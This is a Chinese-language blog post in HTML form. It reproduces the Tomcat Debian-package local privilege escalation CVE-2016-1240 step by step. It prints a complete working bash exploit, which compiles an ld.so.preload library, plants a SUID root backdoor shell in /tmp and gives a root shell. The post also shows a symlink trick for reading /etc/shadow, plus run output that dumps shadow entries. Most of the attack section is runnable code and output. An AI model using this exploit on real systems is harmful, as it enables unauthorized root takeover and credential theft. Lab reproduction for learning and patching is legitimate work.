<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2016-1240）Tomcat本地提权漏洞一、漏洞简介Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：&#x2F;etc&#x2F;init.d&#x2F;tocat*利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！ 二、漏洞影响Tom">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2016-1240%EF%BC%89Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2016-1240）Tomcat本地提权漏洞一、漏洞简介Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：&#x2F;etc&#x2F;init.d&#x2F;tocat*利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！ 二、漏洞影响Tom">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId25.gif">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId26.gif">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId27.gif">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId30.gif">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId34.gif">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId35.gif">
<meta property="article:published_time" content="2022-07-08T06:26:05.508Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId25.gif">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Tomcat/（CVE-2016-1240）Tomcat本地提权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2016-1240%EF%BC%89Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:05.508Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2016-1240）Tomcat本地提权漏洞"><a href="#（CVE-2016-1240）Tomcat本地提权漏洞" class="headerlink" title="（CVE-2016-1240）Tomcat本地提权漏洞"></a>（CVE-2016-1240）Tomcat本地提权漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使<br>deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：<code>/etc/init.d/tocat*</code>利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Tomcat 8 &lt;= 8.0.36-2 Tomcat 7 &lt;= 7.0.70-2 Tomcat 6 &lt;=<br>6.0.45+dfsg-1~deb8u1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使用deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat&lt;版本号&gt;.sh。利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。<br>现在我们查看文件 /etc/init.d/tomcat7 操作如下： 首先我们使用<br>Evrething搜索<code>xshell</code>，选中xshell.exe运行xshell，然后连接上目标机的低权限用户tomcat7，账号是tomcat7，密码是：tomcat7。</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId25.gif"></p>
<p>然后执行命令<code>whoami</code>，可以看到，现在是tomcat7的权限，也就是低权限账户</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId26.gif"></p>
<p>然后执行命令<code>vim /etc/init.d/tomcat7</code>,<br>然后按<code>Esc</code>键,接下来输入英文状态下的字符冒号: <code>set number</code>,找到171行。</p>
<blockquote>
<p>**小提示:**vim是一个文本编辑器，<code>vim /etc/init.d/tomcat7</code>的意思是编辑/etc/init.d/文件夹下的tomcat7文件。</p>
</blockquote>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId27.gif"></p>
<p>其造成漏洞核心代码如下：</p>
<pre><code># Run the catalina.sh script as a daemon 
set +e 
touch &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out
chown $TOMCAT6_USER &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out
</code></pre>
<p>我们阅读上面的shell脚本</p>
<ul>
<li><p>第一行，<code>set +e</code>,要知道<code>set +e</code>是什么意思，得先清楚set -e的含义：<br>  使用set更改shell特性时，符号&quot;+&quot;和&quot;-&quot;的作用分别是打开和关闭指定的模式,<code>set -e</code>的意思是若指令传回值不等于0，则立即退出shell，而<code>set +e</code>的意思反之</p>
</li>
<li><p>  第二行，touch是创建文件夹的意思，创建了catalina.out日志文件，前面的两个字符串定位了PID和BASE，涉及到其他变量这里不做探讨</p>
</li>
<li><p>  第三行，chown是改变文件夹权限的命令，它将catalina.out日志文件的所述用户更改为低权限用户</p>
</li>
</ul>
<p>这个脚本看似是没有什么问题的。但是从上面的脚本可以得出三点信息：</p>
<ol>
<li><p> 这个脚本运行时的权限必然是root权限。因为普通用户是无法使用<code>chown</code>命令，也就是没有更高的权限。</p>
</li>
<li><p> 该脚本使用touch命令创建文件，此时存在以下：文件存在、不存在、存在为符号链接等情况，当文件为符号链接时会默认地对链接的文件进行操作。</p>
</li>
<li><p> 脚本运行完毕后Tomcat服务器启动，此时catalina.out这个log文件的所属用户为tomcat，所属组为root。</p>
</li>
</ol>
<p>综述上述，这就给漏洞利用创造了可能。</p>
<p>接下来我们来验证是否可以利用：</p>
<p>当前的用户为tomcat7。这就是说我们能够更改所属用户为tomcat7的catalina.out这个log文件的内容和属性。<br>更改它的属性，让他指向/etc/shadow/文件夹下，现在我们创建一个指向<br>/etc/shadow 的符号链接。<br>使用命令<code>ln -fs /etc/shadow /var/log/tomcat7/catalina.out</code>,这时候就可以在/etc/shadow下创建一个链接，就相当于Windows的快捷方式一样。</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
<p>此时我们查看文件cataline.out的内容，此时是权限不够，禁止读取cataline.out的内容的：</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p>现在我们需要登陆root账户重启tomcat。登陆方法与登陆Tomcat7<br>用户相同，账号为：root, 密码为：123456 。重启Tomcat的命令为：</p>
<pre><code>service tomcat7 restart
</code></pre>
<p>重启成功之后我们再次使用<code>低权限用户</code>读取cataline.out的内容：使用命令</p>
<pre><code>head /var/log/tomcat6/catalina.out
</code></pre>
<p>使用head命令可以输出文件前十行的内容，而<code>cat</code>命令则是预览文件的全部内容。</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId30.gif"></p>
<p>**原理:**当Tomcat服务重启时，系统默认重新加载<code>/var/log/tomcat6/catalina.out</code>脚本，由于此时tomcat的日志文件指向了<code>/etc/shadow文件</code>;<br>而该文件就是我们之前创建的链接文件，而链接文件属于Tomcat7这个<code>低权限用户</code>，因此，我们就可以查看其中内容了。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本步将使用poc根据Tomcat7漏洞进行提权</p>
<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><pre><code>#!/bin/bash
#
# Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit
#
# CVE-2016-1240
#
# Discovered and coded by:
#
# Dawid Golunski
# http://legalhackers.com
#
# This exploit targets Tomcat (versions 6, 7 and 8) packaging on 
# Debian-based distros including Debian, Ubuntu etc.
# It allows attackers with a tomcat shell (e.g. obtained remotely through a 
# vulnerable java webapp, or locally via weak permissions on webapps in the 
# Tomcat webroot directories etc.) to escalate their privileges to root.
#
# Usage:
# ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]
#
# The exploit can used in two ways:
#
# -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly
# gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. 
# It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up
# a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)
#
# -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to 
# /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. 
# Attackers can come back at a later time and check on the /etc/default/locale file. Upon a 
# Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can
# then add arbitrary commands to the file which will be executed with root privileges by 
# the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default 
# Ubuntu/Debian Tomcat installations).
#
# See full advisory for details at:
# http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH=&quot;/bin/bash&quot;
BACKDOORPATH=&quot;/tmp/tomcatrootsh&quot;
PRIVESCLIB=&quot;/tmp/privesclib.so&quot;
PRIVESCSRC=&quot;/tmp/privesclib.c&quot;
SUIDBIN=&quot;/usr/bin/sudo&quot;

function cleanexit &#123;
    # Cleanup 
    echo -e &quot;\n[+] Cleaning up...&quot;
    rm -f $PRIVESCSRC
    rm -f $PRIVESCLIB
    rm -f $TOMCATLOG
    touch $TOMCATLOG
    if [ -f /etc/ld.so.preload ]; then
        echo -n &gt; /etc/ld.so.preload 2&gt;/dev/null
    fi
    echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;
    exit $1
&#125;

function ctrl_c() &#123;
        echo -e &quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;
    cleanexit 0
&#125;

#intro 
echo -e &quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&quot;
echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;

# Args
if [ $# -lt 1 ]; then
    echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_catalina.out [-deferred]\n&quot;
    exit 3
fi
if [ &quot;$2&quot; = &quot;-deferred&quot; ]; then
    mode=&quot;deferred&quot;
else
    mode=&quot;active&quot;
fi

# Priv check
echo -e &quot;\n[+] Starting the exploit in [\033[94m$mode\033[0m] mode with the following privileges: \n`id`&quot;
id | grep -q tomcat
if [ $? -ne 0 ]; then
    echo -e &quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&quot;
    exit 3
fi

# Set target paths
TOMCATLOG=&quot;$1&quot;
if [ ! -f $TOMCATLOG ]; then
    echo -e &quot;\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn&#39;t exist. Try again.\n&quot;
    exit 3
fi
echo -e &quot;\n[+] Target Tomcat log file set to $TOMCATLOG&quot;

# [ Deferred exploitation ]

# Symlink the log file to /etc/default/locale file which gets executed daily on default
# tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.
# Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been
# restarted and file owner gets changed.
if [ &quot;$mode&quot; = &quot;deferred&quot; ]; then
    rm -f $TOMCATLOG &amp;&amp; ln -s /etc/default/locale $TOMCATLOG
    if [ $? -ne 0 ]; then
        echo -e &quot;\n[!] Couldn&#39;t remove the $TOMCATLOG file or create a symlink.&quot;
        cleanexit 3
    fi
    echo -e  &quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&quot;
    echo -e  &quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&quot;
    echo -ne &quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&quot;
    echo -ne &quot;\n    you&#39;ll be able to add arbitrary commands to the file which will get executed with root privileges&quot;
    echo -ne &quot;\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can&#39;t wait ;)
 \n\n&quot;
    exit 0
fi

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;
cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dlfcn.h&gt;
uid_t geteuid(void) &#123;
    static uid_t  (*old_geteuid)();
    old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);
    if ( old_geteuid() == 0 ) &#123;
        chown(&quot;$BACKDOORPATH&quot;, 0, 0);
        chmod(&quot;$BACKDOORPATH&quot;, 04777);
        unlink(&quot;/etc/ld.so.preload&quot;);
    &#125;
    return old_geteuid();
&#125;
_solibeof_
gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl
if [ $? -ne 0 ]; then
    echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;
    cleanexit 2;
fi

# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e &quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;

# Safety check
if [ -f /etc/ld.so.preload ]; then
    echo -e &quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;
    cleanexit 2
fi

# Symlink the log file to ld.so.preload
rm -f $TOMCATLOG &amp;&amp; ln -s /etc/ld.so.preload $TOMCATLOG
if [ $? -ne 0 ]; then
    echo -e &quot;\n[!] Couldn&#39;t remove the $TOMCATLOG file or create a symlink.&quot;
    cleanexit 3
fi
echo -e &quot;\n[+] Symlink created at: \n`ls -l $TOMCATLOG`&quot;

# Wait for Tomcat to re-open the logs
echo -ne &quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&quot;
echo -e  &quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)
 &quot;
while :; do 
    sleep 0.1
    if [ -f /etc/ld.so.preload ]; then
        echo $PRIVESCLIB &gt; /etc/ld.so.preload
        break;
    fi
done

# /etc/ld.so.preload file should be owned by tomcat user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB &gt; /etc/ld.so.preload
echo -e &quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&quot;
echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;
echo -e &quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;
sudo --help 2&gt;/dev/null &gt;/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
    echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;
    echo -e &quot;\n\033[94mPlease tell me you&#39;re seeing this too ;)
  \033[0m&quot;
else
    echo -e &quot;\n[!] Failed to get root&quot;
    cleanexit 2
fi

# Execute the rootshell
echo -e &quot;\n[+] Executing the rootshell $BACKDOORPATH now! \n&quot;
$BACKDOORPATH -p -c &quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;
$BACKDOORPATH -p

# Job done.
cleanexit 0
</code></pre>
<h4 id="poc运行示例："><a href="#poc运行示例：" class="headerlink" title="poc运行示例："></a>poc运行示例：</h4><pre><code>tomcat7@ubuntu:/tmp$ id
uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7)

tomcat7@ubuntu:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID:    Ubuntu
Description:    Ubuntu 16.04 LTS
Release:    16.04
Codename:    xenial

tomcat7@ubuntu:/tmp$ dpkg -l | grep tomcat
ii  libtomcat7-java              7.0.68-1ubuntu0.1               all          Servlet and JSP engine -- core libraries
ii  tomcat7                      7.0.68-1ubuntu0.1               all          Servlet and JSP engine
ii  tomcat7-common               7.0.68-1ubuntu0.1               all          Servlet and JSP engine -- common files

tomcat7@ubuntu:/tmp$ ./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out 

Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit
CVE-2016-1240

Discovered and coded by: 

Dawid Golunski 

http://legalhackers.com

[+] Starting the exploit in [active] mode with the following privileges: 
uid=110(tomcat7) gid=118(tomcat7) groups=118(tomcat7)

[+] Target Tomcat log file set to /var/log/tomcat7/catalina.out

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 tomcat7 tomcat7 1037464 Sep 30 22:27 /tmp/tomcatrootsh

[+] Symlink created at: 
lrwxrwxrwx 1 tomcat7 tomcat7 18 Sep 30 22:27 /var/log/tomcat7/catalina.out -&gt; /etc/ld.so.preload

[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...
You could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)


[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: 
-rw-r--r-- 1 tomcat7 root 19 Sep 30 22:28 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 1037464 Sep 30 22:27 /tmp/tomcatrootsh

Please tell me you&#39;re seeing this too ;)


[+] Executing the rootshell /tmp/tomcatrootsh now! 

tomcatrootsh-4.3# id
uid=110(tomcat7) gid=118(tomcat7) euid=0(root) groups=118(tomcat7)
tomcatrootsh-4.3# whoami
root
tomcatrootsh-4.3# head -n3 /etc/shadow
root:$6$oaf[cut]:16912:0:99999:7:::
daemon:*:16912:0:99999:7:::
bin:*:16912:0:99999:7:::
tomcatrootsh-4.3# exit
exit
</code></pre>
<p>首先我们下载poc文件，然后执行命令<code>cd /tmp</code>进入目录,然后编辑文件<code>vim poc.sh</code>。将桌面的poc.sh使用Notepad++打开，将文件内容粘贴进去。然后按键盘Esc键，再输入<code>:wq</code>，之后按<br>Enter 键将文件保存。 如果无法写入文件，使用命令</p>
<pre><code>chmod 755 poc.sh
</code></pre>
<p>执行命令后，再次重复上一步即可，chmod的意思是改变文件的权限，775是什么权限呢？第一个数字代表文件所属者的权限，第二个数字代表文件所属者所在组的权限，第三个数字代表其它用户的权限，7=4+2+1</p>
<blockquote>
<p>4：执行时设置用户ID，用于授权给基于文件属主的进程，而不是给创建此进程的用户。<br>2：执行时设置用户组ID，用于授权给基于文件所在组的进程，而不是基于创建此进程的用户。<br>1：设置粘着位。</p>
</blockquote>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId34.gif"></p>
<p>这时，poc文件就已经构造好了，接下来运行脚本运行命令为：</p>
<pre><code>./poc.sh /var/log/tomcat7/catalina.out
</code></pre>
<p>运行之后，会出现卡顿现象，这时候我们切换到root用户，重新启动Tomcat7，这时候使用命令<code>whoami</code>查看当前用户，这时候已经是<br>root 用户了，这时候就提权成功了</p>
<p><img src="/resource/(CVE-2016-1240)Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId35.gif"></p>
<p>可以看到，命令提示符的开头为<code>tomcat</code>低权限用户，而我们执行whoami命令的时候，显示的权限却是root，这样就成功的提权了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/94e4feac245f">https://www.jianshu.com/p/94e4feac245f</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2016-1240%EF%BC%89Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwzm00jgy8v10r1e676i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2016-8735%EF%BC%89Tomcat%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Tomcat/%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>